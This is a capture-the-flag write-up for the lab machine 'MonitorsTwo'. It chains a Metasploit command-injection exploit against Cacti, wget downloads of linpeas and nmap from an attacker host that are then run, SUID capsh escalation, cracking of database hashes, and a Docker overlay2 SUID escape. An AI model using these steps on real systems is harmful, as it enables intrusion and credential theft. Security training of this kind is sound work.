# MonitorsTwo - Easy

```sh
sudo vim /etc/hosts
# add monitorstwo.htb

nmap -T4 -p- -A -Pn -v monitorstwo.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
    * 80/tcp - http - nginx 1.18.0

* the webpage is a login form for 'Cacti', version 1.2.22

* Google shows that it is a RRDTool-based (round robin DB) graphing solution

* attempting default creds like 'admin:admin' does not work for the Cacti login page

* Googling for Cacti 1.2.22 exploits gives us [CVE-2022-46169](https://www.rapid7.com/db/modules/exploit/linux/http/cacti_unauthenticated_cmd_injection/) - an unauthenticated RCE exploit

* attempting the exploit:

    ```sh
    msfconsole -q

    use exploit/linux/http/cacti_unauthenticated_cmd_injection

    options

    set RHOSTS monitorstwo.htb
    set RPORT 80
    set LHOST tun0

    run
    # this works and we get the exploit

    shell
    # launch shell
    ```

* in reverse shell:

    ```sh
    id
    # www-data

    pwd
    # /var/www/html

    ls -la
    # cacti files

    ls -la /home
    # no users

    cat /etc/passwd
    # confirms no standard users

    ls -la /
    # includes .dockerenv and a script

    hostname
    # randomly generated hostname
    
    cat /entrypoint.sh

    cat /var/www/html/cacti.sql
    ```

* the randomly generated hostname and '.dockerenv' file confirms we are in a Docker container

* the 'entrypoint.sh' file contains the creds 'root:root' for the SQL DB; the SQL DB file for Cacti does not give any useful data (it contains the user details in the 'user_auth' table, but it is just 'admin:admin')

* before attempting docker breakout techniques, we can attempt to privesc to root; we can use linpeas for enumeration:

    ```sh
    cd /tmp

    # fetch script from attacker
    wget http://10.10.14.21:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* from the list of SUID binaries in ```linpeas``` output, we can see ```/sbin/capsh``` is included & highlighted

* [GTFObins](https://gtfobins.github.io/gtfobins/capsh/) shows the SUID privesc vector for ```capsh```:

    ```sh
    /sbin/capsh --gid=0 --uid=0 --
    # this works

    id
    # we are root now

    ls -la /root
    # no files of use
    ```

* we can now attempt [docker breakout techniques](https://juggernaut-sec.com/docker-breakout-lpe/) as root, in order to gain access to the host machine, where the users exist:

    ```sh
    cat /proc/1/status | grep -i "seccomp"
    # 'seccomp' value is set to 2, this means it is a non-privileged container
    # if this value was 0, it would be a privileged container

    ls /dev
    # alt way to check for privileged container - this would show lots of file if it is privileged

    capsh --print
    # check capabilities
    ```

* as there are not a lot of capabilities that can be exploited, we need to check for other privesc vectors to get access to the actual host

* we can start by scanning the network for other hosts:

    ```sh
    ip a s
    # 'ip' not found

    hostname -i
    # this gives the IP 172.19.0.3
    
    which nmap
    # nmap is not available on box

    # fetch nmap binary from attacker
    cd /tmp

    wget http://10.10.14.21:8000/nmap

    chmod +x nmap

    ./nmap 172.19.0.0/24
    # this fails due to service-port info missing
    ```
    
* ```nmap``` fails with the errors "unable to find nmap-services! resorting to /etc/services" and "unable to open /etc/services for reading service info"

* as a workaround, we can copy ```/etc/services``` (this does not include any personal info) from attacker and save as 'nmap-services' on the target:

    ```sh
    # on attacker
    cp /etc/services ~/Tools/nmap-services
    ```

    ```sh
    # on target
    wget http://10.10.14.21:8000/nmap-services
    
    ./nmap 172.19.0.0/24
    # this time it works
    ```
    
* ```nmap``` scan shows that host 172.19.0.1 is up with ports 22 (ssh) & 80 (http) open, and host 172.19.0.2 (cacti_db_1.cacti_default) is up with port 3306 (mysql) open

* we can attempt connecting to the MySQL DB on 172.19.0.2 - we cannot connect directly as the shell is not stabilised; we can pass the command as an argument and execute it non-interactively:

    ```sh
    mysql -u root -proot -h 172.19.0.2 -e "show databases;"
    # this works

    # check the non-default database

    mysql -u root -proot -h 172.19.0.2 -D cacti -e "show tables;"

    mysql -u root -proot -h 172.19.0.2 -D cacti -e "select * from user_auth;"
    # this table stores the user details
    ```

* from the 'user_auth' table in 'cacti' database, we get hashes for 2 users - 'admin' ("admin@monitorstwo.htb") & 'marcus' ("marcus@monitorstwo.htb") - these could be users on the main host at 172.19.0.1

* hash identifier tools confirm that these are bcrypt hashes, supported using ```hashcat``` mode 3200 - we can attempt to crack them:

    ```sh
    vim bcrypthashes

    hashcat -a 0 -m 3200 bcrypthashes /usr/share/wordlists/rockyou.txt --force
    ```

* ```hashcat``` cracks 'marcus' user's hash to cleartext 'funkymonkey'

* we can attempt to SSH directly as 'marcus' (if this does not work, next step would be to SSH via the docker container):

    ```sh
    ssh marcus@monitorstwo.htb
    # this works

    cat user.txt

    sudo -l
    # not available

    # basic enumeration using linpeas
    # fetch script

    wget http://10.10.14.21:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-147-generic, Ubuntu 20.04.6
    * ```/usr/bin/ctr``` and ```/usr/sbin/runc``` found for containerisation
    * mails found in ```/var/mail/marcus```, ```/var/spool/mail/marcus```

* checking the mails for 'marcus' at ```/var/mail/marcus```, we can see that it is a Security Bulletin mail from the administrator to all users

* the email mentions 3 vulnerabilities with info, and requests the users to address them:

    * CVE-2021-33033 - affects Linux kernel before 5.11.14
    * CVE-2020-25706 - XSS vulnerability affects Cacti 1.2.13
    * CVE-2021-41091 - directory traversal & command execution vuln that affects Moby, a component in Docker engine, and fixed in version 20.10.9

* from the mentioned CVEs, CVE-2021-33033 & CVE-2021-41091 seem relevant

* Googling for exploits related to CVE-2021-33033 do not give any applicable exploits or PoCs

* for CVE-2021-41091, we can check the current Moby (Docker engine) version:

    ```sh
    docker version
    ```

* the current Docker version is 20.10.5+dfsg1, which means it is vulnerable to CVE-2021-41091

* we can attempt the [exploit for CVE-2021-41091](https://exploit-notes.hdks.org/exploit/container/docker/moby-docker-engine-privilege-escalation/):

    * find the directory which the docker container mounted by running ```findmnt```

    * this gives us multiple directories, but we need to consider only those directories starting with ```/var/lib/docker/overlay2/```:

        ```sh
        ls -la /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/

        ls -la /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
        # list both docker containers to confirm
        ```
    
    * now, we need to prepare the SUID binary in the actual docker container as root - we had this access earlier:

        ```sh
        # in docker container, not host
        chmod u+s /bin/bash
        # prepare the SUID binary for privesc
        ```
    
    * execute the SUID binary in host using the Docker overlay path:

        ```sh
        /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
        # test with both overlay paths, one of them will work

        # we get root
        id

        cat /root/root.txt
        # root flag
        ```
